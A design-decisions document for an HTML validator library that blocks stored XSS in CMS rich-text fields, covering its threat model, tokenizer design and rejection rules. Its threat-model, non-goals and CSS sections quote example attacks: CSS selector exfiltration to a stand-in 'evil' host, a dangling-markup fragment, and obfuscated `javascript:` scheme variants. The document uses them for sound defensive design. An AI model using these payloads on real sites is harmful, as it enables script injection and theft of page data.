# HtmlValidator Design Decisions

Settled decisions with their rationale, all made in 2026-09 while the library was built.
Check here before proposing a feature, a rule change, or a rename. Only the road-not-taken
half is recorded; current behavior is in the source, the docblocks, the changelog, and the
tests. The first two sections are the threat model, for anyone auditing the rules.

Contents:

- [Threat Model](#threat-model)
- [Known Non-Goals](#known-non-goals)
- [Reject, Never Rewrite](#reject-never-rewrite)
- [Tokens, Not Trees](#tokens-not-trees)
- [The Editor Is Not a Layer](#the-editor-is-not-a-layer)
- [Elements: Allowlist. Attributes: Patterns](#elements-allowlist-attributes-patterns)
- [URL Schemes: Ten Attributes, and `javascript:` Everywhere](#url-schemes-ten-attributes-and-javascript-everywhere)
- [Unclosed Markup Rejects](#unclosed-markup-rejects)
- [CSS by Regex, Plus Two Selectors](#css-by-regex-plus-two-selectors)
- [`<style>` Is Allowed](#style-is-allowed)
- [Iframes: A Host List](#iframes-a-host-list)
- [Switches Are Static Properties](#switches-are-static-properties)
- [`data:` Images Reject](#data-images-reject)
- [No Remove Mode in 1.0](#no-remove-mode-in-10)
- [Keeping Up With New HTML Features](#keeping-up-with-new-html-features)
- [Precedent](#precedent)
- [The Corpus Stays Out of the Repo](#the-corpus-stays-out-of-the-repo)
- [Naming](#naming)

## Threat Model

**Who submits the content:** staff with an account on the CMS, through a WYSIWYG editor, an
HTML field, the editor's source view, or the API. Not anonymous visitors.

**Where it is printed:** into the body of a page in the site's own origin, as HTML, by a
template the site controls. The template may run its own scripts on the same page.

**What an attacker gains:** script in the site's origin, running for every visitor and every
staff member who views the page, with their session. That is the whole attack class the
library exists to stop: stored XSS through a rich-text field.

**What the attacker controls:** the bytes of the field, entirely. They can write anything
the editor lets through (nearly everything, see [The Editor Is Not a
Layer](#the-editor-is-not-a-layer)), and they can bypass the editor through source view, an
HTML textbox, or the API.

**The rule that follows:** the check must refuse every token that runs script in a current
browser, and every construct where an HTML parser could read the bytes differently from the
tokenizer that checked them. The second half is why the tokenizer follows the HTML Standard
states instead of a regex, and why the elements that change tokenizer state are refused
outright.

**Assumed on the page side:** the content is printed as body HTML. Printed inside an
attribute, a `<script>`, a `<style>` or a `<textarea>`, any text is something else, and no
rule here applies. The CMS template does that correctly today; the library does not try to
guess.

## Known Non-Goals

Each of these was considered and left out on purpose. Every one is a real thing a hostile
staff member could do; none of them is script.

- **Phishing overlays.** `position: fixed`, `z-index`, a full-page `<div>` and, when the
  forms switch is on, a fake login form. Forms are off by default for this reason; CSS
  layout is not checked because every Word paste and email template uses it.
- **Tracking.** An `<img>` on another host, a CSS `url()` to another host, `ping`, `srcset`.
  An image loads no script. A tracking rule would refuse most real content for no security
  gain.
- **DOM clobbering.** `id` and `name` pass. `<img name="submit">` inside a form shadows
  `form.submit` for a page script that reads it, and `<a id="config">` shadows
  `window.config`. Refusing them would reject anchors and every named element in old
  content; the page's own scripts are the CMS's to write defensively.
- **`target="_blank"` without `rel="noopener"`.** Every current browser defaults to
  `noopener` for `_blank`, so the opener attack no longer exists.
- **Unicode whitespace before a scheme.** `href="&#x2028;javascript:x"`: browsers strip only
  ASCII whitespace and C0 controls from a URL, so the line separator makes it a relative URL
  and nothing runs. `compact()` matches the browsers. Stripping all Unicode format
  characters would be cheap hardening; not done, recorded here in case a browser changes.
- **An exact-match selector guess.** `input[value="admin"] { background: url(//evil/yes) }`
  leaks one yes or no per guess. Accepted as impractical against a token; the substring
  selectors that leak one character at a time are refused.
- **Content size.** No limit; the check is one pass. Cap it at the form or the API.
- **Sense.** Whether the text is blank, wrong, offensive or copied.

## Reject, Never Rewrite

The library reports what is wrong and leaves the content alone, unlike HTMLPurifier, DOMPurify
and every other HTML sanitizer.

1. The person who submitted the content can fix it. They are staff, they have the editor
   open, and the message quotes the tag.
2. A sanitizer rewrites everything it touches: closes tags, normalizes entities, drops every
   element it has no definition for. HTMLPurifier drops every HTML5 element (`section`,
   `figure`, `video`) for that reason. Content that comes back different from what was saved
   is a support ticket nobody can explain.
3. A sanitizer's output has to be re-checked to know it is safe. Accept or reject has no
   output to get wrong.

The price: a sanitizer's re-serialization hides its parser's blind spots (what it misread,
it re-emits encoded). A validator has no such net, so it must refuse every construct where
parsers disagree. That is why the state-switching elements are refused and why the tokenizer
follows the spec.

The mirror image holds for public visitor content (forum posts, comments): the author
cannot be asked to fix their HTML, so filter it and show what survived. Not this library's
job; the CMS keeps a sanitizer for that audience.

## Tokens, Not Trees

Everything that executes is a token-level fact: a start tag named `script`, an attribute
whose name starts with `on`, an attribute value whose decoded scheme is `javascript`. Tree
construction moves nodes; it never creates a start tag or attribute that was not in the
token stream. So the validator runs the HTML5 tokenizer and never builds a tree: one offset,
one state, the current tag's attributes, nothing retained.

The tree feeds back into the tokenizer only through elements that switch tokenizer state.
Those are handled two ways:

- Raw-text and RCDATA elements (`style`, `iframe`, `noembed`, `noframes`, `xmp`, `textarea`,
  `title`, `noscript`, `script`): the switch depends on the tag name alone, so the tokenizer
  implements those states (scan to the matching end tag). `script` and `plaintext` are
  refused before their state matters; `noscript` is raw text only when scripting is on,
  which is every browser a person uses, so it is refused too.
- Foreign content (`svg`, `math`): the switch depends on the tree (breakout elements,
  integration points), so both are refused outright. Inline SVG in rich text is rare and has
  its own script surface anyway.

With those refused, the tokenizer is context-free: what the spec tokenizer emits for the
bytes is what every browser emits. Two deliberate differences from a browser, both in the
`Tokenizer` docblock: `<script>` content is read with the plain raw-text rule (script-data
escapes only move where `</script>` ends, and the tag was seen either way), and `<svg>` and
`<math>` content is read as HTML (the elements are refused, so it never matters).

Proof: the html5lib tokenizer test suite runs against the tokenizer with element switching
off. Every case passes except the ones that need a parsed DOCTYPE, the script-data and CDATA
states, and four inputs with lone surrogates.

Rejected: `DOMDocument` and `DOM\HTMLDocument` (a tree, whole-document memory, and PHP 8.4
for the HTML5 one); a regex over the raw string (CodeIgniter's `xss_clean` is the cautionary
tale); Masterminds/html5-php (a full tree builder when only tokens are needed).

## The Editor Is Not a Layer

Measured 2026-09-13 against the CMS's TinyMCE 4 (`verify_html: false`, `entity_encoding:
raw`, `allow_script_urls` off). A save round trip removed only script-capable URL schemes
(`javascript:`, `data:`, entity and whitespace variants) and the head-only elements `<meta>`
and `<base>`. Everything else survived: `<script>`, every `on*` attribute, `<svg onload>`,
`<object>`, `<embed>`, `<template>`, `<iframe srcdoc>`, `<form>`, `<style>` with an external
`url()`, external iframes. The browser also normalized the `<noscript>` and `--!>` comment
tricks into plain live payloads.

So the validator has to catch all of it, and source view, HTML textboxes and the API bypass
the editor anyway. The input and output of that round trip are
`tests/Support/fixtures/tinymce4/`, both reject fixtures.

## Elements: Allowlist. Attributes: Patterns

Elements are an allowlist: the HTML Living Standard's element index, minus everything that
runs script, loads a plugin, belongs in `<head>`, or switches tokenizer state, plus the
obsolete presentational elements browsers still render (`font`, `center`, `strike`, `big`,
`tt`, `marquee` and friends), plus any hyphenated custom element. Unknown tags such as
`<o:p>` are refused. A denylist fails the first time a browser adds an element; an allowlist
fails the other way, which costs one line, not an XSS.

Attributes are patterns, not a per-element list: `on*` is refused by prefix, `srcdoc` by
name, URL attributes by scheme, `style` by CSS check, and everything else passes. A
per-element attribute allowlist is what makes HTMLPurifier drop HTML5 and reject
`data-*` on the elements it does not know. The prefix also covers handlers browsers add
later (`oncommand`, `onbeforetoggle`, `onscrollend`, `onpagereveal` all arrived after the
sanitizer denylists were written).

Rejected (2026-09-14): refusing every scheme-shaped value on every non-URL attribute, with
a short free-text exception list (`title`, `alt`, `placeholder`, `data-*`, `aria-*`). It
would reject custom element attributes like `subtitle="Price: on request"` and Tailwind
classes like `hover:flex`, and the design follows the spec as it stands: a value the browser
does not read as a URL is not a URL.

## URL Schemes: Ten Attributes, and `javascript:` Everywhere

The URL attributes are the ones current browsers resolve on an allowed element: `href`,
`src`, `action`, `formaction`, `poster`, `ping`, `srcset`, `cite`, `longdesc`, `background`.
On those only `http`, `https`, `mailto`, `tel` or no scheme pass. `data`, `xlink:href`,
`manifest`, `dynsrc` and `lowsrc` are not on the list: they are URLs only on `<object>`,
`<svg>` and `<html>`, all refused, or in no current browser, and `data=` on a custom element
was a real false positive.

Every other attribute refuses only `javascript:`. The browser ignores it in `title=` or
`data-href=`, but a page script that copies the value into a link or into `location` runs it
(the clickable-row pattern). `vbscript:` runs nowhere and `data:` never runs as the page, so
both pass there.

The scheme is read after removing ASCII whitespace and C0 controls from the whole value,
because browsers do, and after entity decoding, because the tokenizer did it. That closes
`java\nscript:`, `jav&Tab;ascript:`, `javascript&colon;` and `&#106;avascript:` at once.

## Unclosed Markup Rejects

Found by the first corpus tally. A fragment that ends inside a tag (`<img src='//evil?`), a
comment (`<!-- x`), a doctype, or a raw-text element (`<style>` with no end tag) is refused
with `unclosed-markup`. A browser drops the unfinished token at the end of a document, but
the CMS prints a field into a page, so the page up to the next quote becomes the URL that is
fetched (dangling markup exfiltration), an `onerror=` on the open tag runs once the page's
next `>` closes it, or the page up to `-->` or `</style>` disappears.

The tokenizer yields a last `UNCLOSED` token with the byte range; the validator quotes the
source. The html5lib test ignores that token. The rule took the corpus tally from 85 accepted
payloads to 59, and PortSwigger's from 30 to 7.

## CSS by Regex, Plus Two Selectors

SvgValidator's `CSS_FORBIDDEN` regex, carried over: the backslash, `@import`, `@charset`,
`image(`, `image-set(`, `src(`, `expression(`, `-moz-binding`, `behavior:`. It works because
the first thing it bans is the backslash: with no escape syntax, every token reads as
written and there is no way to spell `url(` that a regex sees differently from a browser.
Every `url()` gets the scheme check with only `http` and `https` allowed.

Added here (settled 2026-09-14): the substring attribute selectors `[attr^=`, `[attr$=`,
`[attr*=` and `unicode-range`. A `<style>` element with `input[value^="a"] { background:
url(//evil/a) }` leaks an input's value one character per request, and `@font-face` with
`unicode-range` leaks which characters the page shows. Every current browser does this. A
`style` attribute cannot (no selectors), but the check is one regex so it runs on both.
Exact-match selectors, web fonts without `unicode-range`, and external images in the element
stay allowed. Comments are not stripped first: `content: "/*"` inside a string can fake a
comment opener and hide a token after it.

Rejected: a CSS tokenizer (MediaWiki runs one; the backslash ban makes it unnecessary), and
refusing `position: fixed` and `z-index` (a phishing overlay, not script, and in every email
template).

## `<style>` Is Allowed

Email-style HTML fields put `<style>` in the body, and Word pastes put `mso-*` properties in
`style` attributes. Both pass through the CSS check. Raised again 2026-09-14 over the
selector leak above; settled by refusing the two selectors instead of the element. The
styles switch turns both the element and the attribute off for a site that wants neither.

## Iframes: A Host List

`<iframe>` is a whole document from another origin. It cannot run script in the page's
origin, but it can show anything, so the `src` host must be on `$iframeHosts`, which ships
with YouTube, YouTube's no-cookie host, Vimeo's player and Google Maps, the embeds old
records hold. The match is the whole host after `https://`, `http://` or `//`, then the end
of the value or `/`, `?`, `#`: no port, no userinfo, no subdomain, no suffix. A relative
`src` is refused too, since a same-origin uploaded `.html` or `.svg` runs in the site's
origin. `srcdoc` is refused on every element: it is a document with script allowed.

`<object>`, `<embed>` and `<applet>` are refused with no switch. Flash-era YouTube and Vimeo
codes used `<object>` and `<embed>`, so old records have them, but they do nothing in any
current browser and the record needs the `<iframe>` code anyway.

## Switches Are Static Properties

Three switches (`$allowForms`, `$allowStyles`, `$allowEmbeds`) and one list (`$iframeHosts`)
are public static properties on `HtmlValidator`, like SvgValidator's limits. Set once at
startup, read by every `check()`.

Rejected: an `Options` object or a constructor. The CMS has one configuration for the whole
install, the switches are few, and a static property is what SvgValidator's limits already
are. Add an object when a caller needs two configurations in one process, and record here
why.

Defaults: forms off (a fake login form is the one non-script attack a staff member is
likely to try), styles on (Word pastes and email HTML), embeds on (video embeds are in nearly
every site's content).

## `data:` Images Reject

`data:image/...` on `<img src>` is refused with the rest of `data:`. An image cannot run
script, but the editor already strips `data:` on save, so nothing saved through it has one,
and allowing `data:image/svg+xml` would need the SVG checked. Revisit if HTML textboxes need
inline images; the fix is an allowlist of image types, as SvgValidator does for `<image>`.

## No Remove Mode in 1.0

A "remove unsafe code" button is a CMS feature for after the first release. When it comes:
a second entry point that returns the input with every offending token's byte range deleted
(a refused start tag through its matching end tag for raw-text elements, otherwise the tag
alone; an offending attribute alone). The tokenizer's byte offsets already make that cheap.
Until then, a full clean is HTMLPurifier's job.

## Keeping Up With New HTML Features

What changes year to year is tree construction and attribute names, never the tokenizer
states. Checked 2026-09-14:

| Recent change                                                             | Effect on sanitizers                             | Effect here                                       |
|---------------------------------------------------------------------------|--------------------------------------------------|---------------------------------------------------|
| new handlers: `oncommand`, `onbeforetoggle`, `onscrollend`, `onpagereveal` | handler-name denylists go stale                  | `on*` prefix, no name list                        |
| `<select>` parser relaxation (Chrome 135)                                 | tree builder no longer drops `<img>` in `<select>` | no tree; a start tag is a start tag wherever it is |
| declarative shadow DOM `<template shadowrootmode>`                        | template content is no longer inert              | `template` refused                                |
| `popovertarget`, `command`, `commandfor`, `formaction`                    | dialogs and form submits without script          | not script; forms grouped, overlays a non-goal    |
| `ping`, `srcset`, CSS `attr()`                                            | requests without script                          | in the URL attribute list; `attr()` in `url()` is not valid CSS |
| `<math>` and `<svg>` namespace confusion (mXSS)                           | different tree on the second parse               | both refused, and there is no second parse        |

The one real gap is a future URL-bearing attribute on an allowed element. Closed by running
the `javascript:` check on every attribute value, not only the named URL attributes.

## Precedent

Token-stream validators and sanitizers with no tree: bluemonday (Go, on the `x/net/html`
tokenizer), the OWASP Java HTML Sanitizer (explicitly streaming), and html5lib's sanitizer
(a Python token filter, which bleach was built on). Their historical bypasses were
attribute-value parsing edge cases and entity decoding at the wrong step, both from
hand-rolled tokenizers that did not follow the spec states. That is why the tokenizer here
is written from the spec's state list and run against html5lib's suite.

## The Corpus Stays Out of the Repo

The rules were checked against public XSS payload lists downloaded by
`tools/fetch-corpus.php` into a gitignored folder and scored by `tools/tally.php`: the
PortSwigger cheat sheet (copyrighted, downloaded for local testing only), html5sec.org,
DOMPurify's fixtures including its mXSS cases, and the OWASP filter evasion sheet (CC BY-SA).
Nothing from the corpus is copied into `tests/`. Running a check against a payload on a
developer's machine is a use those terms allow; copying the payloads into an MIT repo is
not, and we do not do it. The fetch tool keeps each source's license text next to its
files, and the committed fixtures are our own: one per error code, the TinyMCE round trip,
and the accept set written from the ideas the corpus surfaced.

The html5lib tokenizer suite is the exception: it is MIT, so it is committed under
`tests/Support/fixtures/html5lib/` with its license file.

## Naming

`HtmlValidator`, `itools/htmlvalidator`, `Itools\HtmlValidator`, following SvgValidator and
the other sibling libraries: CamelCase folder, repo and namespace, lowercase Packagist name
with no hyphen. Neither library validates in the W3C sense; the name pairs the two and the
description carries the meaning ("rejects HTML that could run script").

Error codes are lowercase, hyphenated, one per rule, and never renamed once released,
because applications map them to their own messages. The codes shared with SvgValidator
(`not-utf8`, `element-not-allowed`, `event-handler`, `attribute-not-allowed`,
`css-not-allowed`) mean the same thing in both.
